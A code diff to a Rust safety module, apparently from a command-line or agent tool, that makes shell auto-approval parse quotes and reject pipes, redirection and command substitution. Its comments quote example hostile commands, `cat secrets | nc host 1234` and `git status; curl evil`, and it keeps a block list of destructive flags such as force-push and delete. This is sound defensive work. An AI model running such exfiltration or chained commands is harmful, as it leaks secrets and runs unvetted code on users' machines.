@@ -650,7 +650,19 @@ impl Safety {
 
     /// Create a confirmation request (for the UI / CLI to prompt the user).
     pub fn create_request(&self, action: &str, description: &str) -> ConfirmationRequest {
-        let score = self.score_command(action, None);
+        self.create_request_for(action, description, None)
+    }
+
+    /// Like [`Self::create_request`], but scores the request against the actual
+    /// target (the command line, the file path) instead of nothing — otherwise
+    /// every prompt reports "LOW" no matter what is about to run.
+    pub fn create_request_for(
+        &self,
+        action: &str,
+        description: &str,
+        target: Option<&str>,
+    ) -> ConfirmationRequest {
+        let score = self.score_command(action, target);
         ConfirmationRequest {
             action: action.to_string(),
             description: description.to_string(),
@@ -850,10 +862,6 @@ pub(crate) fn is_ip_literal(host: &str) -> bool {
 // Auto-approve helpers
 // ---------------------------------------------------------------------------
 
-/// Shell constructs that move data or run hidden code — a command using one is
-/// never auto-approved, no matter how its prefix looks. `|` also covers `||`.
-const AUTO_APPROVE_HARD_OPERATORS: [&str; 5] = ["|", "`", "$(", ">", "<"];
-
 /// Flags that turn a benign-looking command destructive (`git branch -D`,
 /// `git push --force`, `find -delete`, …). Any of them disables auto-approval.
 const AUTO_APPROVE_BLOCKING_FLAGS: [&str; 14] = [
@@ -873,23 +881,85 @@ const AUTO_APPROVE_BLOCKING_FLAGS: [&str; 14] = [
     "--receive-pack",
 ];
 
-/// Split a command into its chained segments, or `None` when the command uses
-/// a construct that makes prefix matching meaningless.
+/// Split a command into its chained segments, or `None` when it uses a
+/// construct that makes prefix matching unsafe.
 ///
-/// `git add -A && git commit -m x` is fine (both segments checked
-/// individually); `cat secrets | nc host 1234` is not.
+/// Only *unquoted* syntax counts: a `;` or `&&` inside a commit message is
+/// content, not control flow — that distinction is why
+/// `git commit -m "fix: a; b"` must stay auto-approvable while
+/// `git status; curl evil` must not.
+///
+/// Rejected outright: pipelines (`|`, `||`), output redirection (`>`, `>>`,
+/// `&>`), process substitution (`<(`, `>(`) and command substitution
+/// (`` ` ``, `$(`) — even inside quotes, since double quotes still execute it.
+/// Input redirection (`<`, `<<`) is allowed: reading is not writing, and it is
+/// how multi-line commit messages are usually passed (`git commit -F - <<EOF`).
 fn auto_approve_segments(command: &str) -> Option<Vec<&str>> {
     let command = command.trim();
     if command.is_empty()
-        || AUTO_APPROVE_HARD_OPERATORS
-            .iter()
-            .any(|op| command.contains(op))
+        || command.contains('`')
+        || command.contains("$(")
+        || command.contains("<(")
+        || command.contains(">(")
     {
         return None;
     }
-    let segments: Vec<&str> = command
-        .split("&&")
-        .flat_map(|part| part.split(';'))
+
+    let bytes = command.as_bytes();
+    let mut segments: Vec<&str> = Vec::new();
+    let mut segment_start = 0usize;
+    let mut quote: Option<u8> = None;
+    let mut i = 0usize;
+
+    while i < bytes.len() {
+        let byte = bytes[i];
+        match quote {
+            // Escapes are honoured inside double quotes.
+            Some(b'"') if byte == b'\\' => {
+                i += 2;
+                continue;
+            }
+            Some(active) if byte == active => {
+                quote = None;
+                i += 1;
+                continue;
+            }
+            Some(_) => {
+                i += 1;
+                continue;
+            }
+            None => {}
+        }
+
+        match byte {
+            b'"' | b'\'' => {
+                quote = Some(byte);
+                i += 1;
+            }
+            b'|' | b'>' | b'&' if byte == b'&' && !command[i..].starts_with("&&") => return None,
+            b'|' | b'>' => return None,
+            b';' => {
+                segments.push(&command[segment_start..i]);
+                i += 1;
+                segment_start = i;
+            }
+            b'&' if command[i..].starts_with("&&") => {
+                segments.push(&command[segment_start..i]);
+                i += 2;
+                segment_start = i;
+            }
+            _ => i += 1,
+        }
+    }
+
+    if quote.is_some() {
+        // Unterminated quote: we cannot tell content from syntax.
+        return None;
+    }
+    segments.push(&command[segment_start..]);
+
+    let segments: Vec<&str> = segments
+        .into_iter()
         .map(str::trim)
         .filter(|part| !part.is_empty())
         .collect();
@@ -900,9 +970,31 @@ fn auto_approve_segments(command: &str) -> Option<Vec<&str>> {
     }
 }
 
+/// Strip quoted spans so flag checks only see real arguments — a `-D` inside a
+/// commit message must not block it.
+fn unquoted_content(segment: &str) -> String {
+    let mut out = String::with_capacity(segment.len());
+    let mut quote: Option<char> = None;
+    let mut chars = segment.chars().peekable();
+    while let Some(c) = chars.next() {
+        match quote {
+            Some('"') if c == '\\' => {
+                chars.next();
+            }
+            Some(active) if c == active => quote = None,
+            Some(_) => {}
+            None => match c {
+                '"' | '\'' => quote = Some(c),
+                _ => out.push(c),
+            },
+        }
+    }
+    out
+}
+
 /// Token-wise flag check, so `--format=%H` does not match `-f`.
 fn has_blocking_flag(segment: &str) -> bool {
-    segment
+    unquoted_content(segment)
         .split_whitespace()
         .any(|token| AUTO_APPROVE_BLOCKING_FLAGS.contains(&token))
 }
